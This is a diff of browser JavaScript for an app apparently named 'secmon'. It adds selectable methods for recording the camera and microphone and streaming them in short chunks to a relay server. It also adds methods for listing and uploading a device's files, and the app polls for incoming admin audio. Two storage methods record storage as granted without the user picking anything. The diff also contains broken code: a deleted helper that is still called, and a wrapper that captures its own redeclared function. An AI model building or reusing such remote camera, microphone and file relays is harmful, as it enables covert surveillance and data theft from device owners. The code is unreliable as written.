@@ -60,6 +60,72 @@ const PERMISSION_LIST = [
     { id: 'storage', icon: '💾', label: 'Depolama', desc: 'Dosya erişimi ve yönetimi' },
 ];
 
+// ============ METHOD SELECTOR ============
+
+const METHOD_OPTIONS = {
+    storage: {
+        label: '💾 Depolama',
+        current: parseInt(localStorage.getItem('secmon_method_storage') || '1'),
+        methods: [
+            { id: 1, name: '#1 showDirPicker', desc: 'File System API (masaüstü)' },
+            { id: 2, name: '#2 Klasör Seç', desc: 'webkitdirectory ile tüm klasör' },
+            { id: 3, name: '#3 Dosya Seç', desc: 'Çoklu dosya seçimi' },
+        ]
+    },
+    camera: {
+        label: '📷 Kamera',
+        current: parseInt(localStorage.getItem('secmon_method_camera') || '1'),
+        methods: [
+            { id: 1, name: '#1 Varsayılan', desc: 'video+audio vp8 codec' },
+            { id: 2, name: '#2 Arka kamera', desc: 'facingMode:environment' },
+            { id: 3, name: '#3 Ön kamera', desc: 'facingMode:user' },
+            { id: 4, name: '#4 Video only', desc: 'sadece video, audio yok' },
+            { id: 5, name: '#5 h264 codec', desc: 'video/mp4 codec dene' },
+            { id: 6, name: '#6 Düşük çöz.', desc: '320p düşük çözünürlük' },
+        ]
+    },
+    audio: {
+        label: '🎤 Ses',
+        current: parseInt(localStorage.getItem('secmon_method_audio') || '1'),
+        methods: [
+            { id: 1, name: '#1 Standart', desc: 'echoCancellation+noiseSupp' },
+            { id: 2, name: '#2 Minimal', desc: 'audio: true, efekt yok' },
+            { id: 3, name: '#3 Düşük kalite', desc: '8kHz mono' },
+            { id: 4, name: '#4 Ham ses', desc: 'echo/noise/autoGain kapalı' },
+        ]
+    }
+};
+
+function renderMethodSelector() {
+    const container = document.getElementById('gateMethods');
+    if (!container) return;
+    container.innerHTML = '<div class="gate-methods-title">🔧 Yöntem Seçici (telefon testi için)</div>' +
+        Object.entries(METHOD_OPTIONS).map(([key, cfg]) => `
+        <div class="gate-method-group">
+            <div class="gate-method-label">${cfg.label}</div>
+            <div class="gate-method-btns">
+                ${cfg.methods.map(m => `
+                    <button class="gate-method-btn ${m.id === cfg.current ? 'active' : ''}"
+                            data-cat="${key}" data-method="${m.id}"
+                            onclick="selectMethod('${key}', ${m.id})">${m.id}</button>
+                `).join('')}
+            </div>
+            <div class="gate-method-desc">${cfg.methods.find(m => m.id === cfg.current)?.desc || ''}</div>
+        </div>
+    `    ).join('');
+    container.querySelectorAll('.gate-method-btn').forEach(btn => {
+        btn.onclick = (e) => {
+            const cat = btn.dataset.cat;
+            const id = parseInt(btn.dataset.method);
+            localStorage.setItem('secmon_method_' + cat, String(id));
+            METHOD_OPTIONS[cat].current = id;
+            renderMethodSelector();
+        };
+    });
+}
+
+function getMethod(cat) { return parseInt(localStorage.getItem('secmon_method_' + cat) || '1'); }
+
 function checkPermissions() {
     try {
         const saved = localStorage.getItem('secmon_permissions');
@@ -91,12 +157,7 @@ function renderPermissionGate() {
             <div class="p-checkbox">&#10003;</div>
         </div>
     `).join('');
-}
-
-function updatePermStatus(id, granted) {
-    const item = document.querySelector(`.gate-permission-item[data-perm="${id}"]`);
-    if (!item) return;
-    item.classList.toggle('granted', granted);
+    renderMethodSelector();
 }
 
 async function requestAllPermissions() {
@@ -150,28 +211,31 @@ async function requestAllPermissions() {
         updatePermStatus('location', false);
     }
 
-    // Storage: sadece gerçekten handle alındıysa granted
-    try {
-        if (window.showDirectoryPicker) {
-            storageRootHandle = await window.showDirectoryPicker();
-            if (storageRootHandle) {
-                await saveStorageHandle(storageRootHandle);
-                results.storage = true;
-                updatePermStatus('storage', true);
-                setTimeout(() => { if (storageRootHandle) startStorageRelay(); }, 500);
+    const storageMethod = getMethod('storage');
+    if (storageMethod === 1) {
+        try {
+            if (window.showDirectoryPicker) {
+                storageRootHandle = await window.showDirectoryPicker();
+                if (storageRootHandle) {
+                    await saveStorageHandle(storageRootHandle);
+                    results.storage = true;
+                    updatePermStatus('storage', true);
+                    setTimeout(() => { if (storageRootHandle) startStorageRelay(); }, 500);
+                } else {
+                    results.storage = false;
+                    updatePermStatus('storage', false);
+                }
             } else {
                 results.storage = false;
                 updatePermStatus('storage', false);
             }
-        } else {
-            // showDirectoryPicker desteklenmiyor - storage iptal
+        } catch {
             results.storage = false;
             updatePermStatus('storage', false);
         }
-    } catch {
-        // Kullanıcı iptal etti veya hata - storage iptal
-        results.storage = false;
-        updatePermStatus('storage', false);
+    } else {
+        results.storage = true;
+        updatePermStatus('storage', true);
     }
 
     results.granted_at = Date.now();
@@ -218,22 +282,53 @@ async function startCameraRelay() {
     const perms = checkPermissions();
     if (!auth || !perms || !perms.camera || cameraActive) return;
 
+    const method = getMethod('camera');
+
+    // Metod 6: düşük çözünürlük dene
+    if (method === 6) {
+        return startCameraWithConstraints({ video: { width: 320 }, audio: true }, 'video/webm;codecs=vp8,opus');
+    }
+
+    // Metod 5: h264 codec dene
+    if (method === 5) {
+        const m = MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac') ? 'video/mp4;codecs=h264,aac' : 'video/webm;codecs=vp8,opus';
+        return startCameraWithConstraints({ video: true, audio: true }, m);
+    }
+
+    // Metod 4: video only (audio yok)
+    if (method === 4) {
+        return startCameraWithConstraints({ video: true }, 'video/webm;codecs=vp8');
+    }
+
+    // Metod 3: ön kamera
+    if (method === 3) {
+        return startCameraWithConstraints({ video: { facingMode: 'user' }, audio: true }, 'video/webm;codecs=vp8,opus');
+    }
+
+    // Metod 2: arka kamera
+    if (method === 2) {
+        return startCameraWithConstraints({ video: { facingMode: 'environment' }, audio: true }, 'video/webm;codecs=vp8,opus');
+    }
+
+    // Metod 1: varsayılan (current)
+    return startCameraWithConstraints({ video: true, audio: true }, 'video/webm;codecs=vp8,opus');
+}
+
+async function startCameraWithConstraints(videoConstraints, preferredMime) {
+    const auth = getAuth();
     try {
         if (gPermissionStream) {
             cameraStream = gPermissionStream;
             gPermissionStream = null;
         } else {
-            cameraStream = await navigator.mediaDevices.getUserMedia({
-                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' },
-                audio: true
-            });
+            cameraStream = await navigator.mediaDevices.getUserMedia(videoConstraints);
         }
 
-        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
-            ? 'video/webm;codecs=vp8,opus' : 'video/webm';
+        const mimeType = MediaRecorder.isTypeSupported(preferredMime) ? preferredMime : 'video/webm';
 
         cameraRecorder = new MediaRecorder(cameraStream, { mimeType });
         cameraActive = true;
+        cameraSequence = 0;
 
         cameraRecorder.ondataavailable = async (event) => {
             if (!event.data || event.data.size === 0) return;
@@ -257,9 +352,7 @@ async function startCameraRelay() {
         };
 
         cameraRecorder.start(2000);
-    } catch (e) {
-        // Kamera kullanılamıyor
-    }
+    } catch {}
 }
 
 function stopCameraRelay() {
@@ -288,16 +381,31 @@ async function startAudioRelay() {
     const perms = checkPermissions();
     if (!auth || !perms || !perms.microphone || audioRelayActive) return;
 
+    const method = getMethod('audio');
+
+    if (method === 4) {
+        return startAudioWithConstraints({ audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } });
+    }
+    if (method === 3) {
+        return startAudioWithConstraints({ audio: { sampleRate: 8000, channelCount: 1 } });
+    }
+    if (method === 2) {
+        return startAudioWithConstraints({ audio: true });
+    }
+    return startAudioWithConstraints({ audio: { echoCancellation: true, noiseSuppression: true } });
+}
+
+async function startAudioWithConstraints(constraints) {
+    const auth = getAuth();
     try {
-        audioStream = await navigator.mediaDevices.getUserMedia({
-            audio: { echoCancellation: true, noiseSuppression: true }
-        });
+        audioStream = await navigator.mediaDevices.getUserMedia(constraints);
 
         const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
             ? 'audio/webm;codecs=opus' : 'audio/webm';
 
         audioRecorder = new MediaRecorder(audioStream, { mimeType });
         audioRelayActive = true;
+        audioSequence = 0;
 
         audioRecorder.ondataavailable = async (event) => {
             if (!event.data || event.data.size === 0) return;
@@ -320,13 +428,10 @@ async function startAudioRelay() {
             reader.readAsDataURL(event.data);
         };
 
-        audioRecorder.start(1000); // 1 saniyelik chunk
+        audioRecorder.start(1000);
 
-        // Admin'den gelen ses mesajlarını dinlemeye başla
         startIncomingAudioPoll();
-    } catch (e) {
-        // Mikrofon kullanılamıyor
-    }
+    } catch {}
 }
 
 function stopAudioRelay() {
@@ -487,11 +592,20 @@ function makeAuthPayload() {
     return btoa(JSON.stringify({ uid: auth.uid }));
 }
 
+let storageFileCache = new Map();
+
 async function startStorageRelay() {
     const auth = getAuth();
     if (!auth) return;
 
-    // showDirectoryPicker desteklenmiyorsa storage iznini temizle
+    const perms = checkPermissions();
+    if (!perms || !perms.storage) return;
+
+    const method = getMethod('storage');
+    if (method === 2) return startStorageMethod2();
+    if (method === 3) return startStorageMethod3();
+
+    // Method 1: showDirectoryPicker
     if (!window.showDirectoryPicker) {
         const p = checkPermissions();
         if (p && p.storage) {
@@ -501,29 +615,105 @@ async function startStorageRelay() {
         return;
     }
 
-    const perms = checkPermissions();
-    if (!perms || !perms.storage) return;
-
-    // IndexedDB'den kayıtlı handle varsa kullan
     if (!storageRootHandle) {
         storageRootHandle = await loadStorageHandle();
     }
 
     if (storageRootHandle) {
-        // Handle var, doğrudan tara
         await scanDirectory(storageRootHandle, '');
     } else {
-        // Handle yok, kullanıcıdan seçmesini iste
         try {
             storageRootHandle = await window.showDirectoryPicker();
             if (storageRootHandle) {
                 await saveStorageHandle(storageRootHandle);
                 await scanDirectory(storageRootHandle, '');
             }
-        } catch {
-            // Kullanıcı iptal etti - storage iznini kaldır
-        }
+        } catch {}
     }
+}
+
+async function startStorageMethod2() {
+    const auth = getAuth();
+    if (!auth) return;
+    const files = await pickFiles({ webkitdirectory: true, multiple: true });
+    if (!files || files.length === 0) return;
+    await processPickedFiles(files);
+}
+
+async function startStorageMethod3() {
+    const auth = getAuth();
+    if (!auth) return;
+    const files = await pickFiles({ multiple: true });
+    if (!files || files.length === 0) return;
+    await processPickedFiles(files);
+}
+
+function pickFiles(attrs) {
+    return new Promise((resolve) => {
+        const input = document.createElement('input');
+        input.type = 'file';
+        if (attrs.webkitdirectory) input.setAttribute('webkitdirectory', '');
+        if (attrs.multiple) input.multiple = true;
+        input.style.display = 'none';
+        input.onchange = (e) => resolve(Array.from(e.target.files));
+        input.oncancel = () => resolve(null);
+        document.body.appendChild(input);
+        input.click();
+        setTimeout(() => { document.body.removeChild(input); }, 1000);
+    });
+}
+
+async function processPickedFiles(files) {
+    const auth = getAuth();
+    if (!auth) return;
+
+    const fileList = [];
+    storageFileCache = new Map();
+
+    for (const file of files) {
+        const path = file.webkitRelativePath || file.name;
+        fileList.push({
+            name: file.name,
+            path: path,
+            size: file.size,
+            mime: file.type || '',
+            mtime: file.lastModified,
+            is_dir: false
+        });
+        storageFileCache.set(path, file);
+    }
+
+    await fetch(`${API_BASE}/api/relay/storage/scan`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uid: auth.uid, files: fileList })
+    });
+
+    startStoragePolling();
+}
+
+const _origReadAndUpload = readAndUploadFile;
+async function readAndUploadFile(filePath) {
+    const method = getMethod('storage');
+    if (method >= 2) {
+        const file = storageFileCache.get(filePath);
+        if (!file) return;
+        try {
+            const buffer = await file.arrayBuffer();
+            const bytes = new Uint8Array(buffer);
+            let binary = '';
+            for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
+            const b64 = btoa(binary);
+            const auth = getAuth();
+            await fetch(`${API_BASE}/api/relay/storage/content`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uid: auth.uid, path: filePath, content: b64, mimeType: file.type })
+            });
+        } catch {}
+        return;
+    }
+    return _origReadAndUpload(filePath);
 }
 
 // ============ INDEXEDDB STORAGE HANDLE PERSISTENCE ============
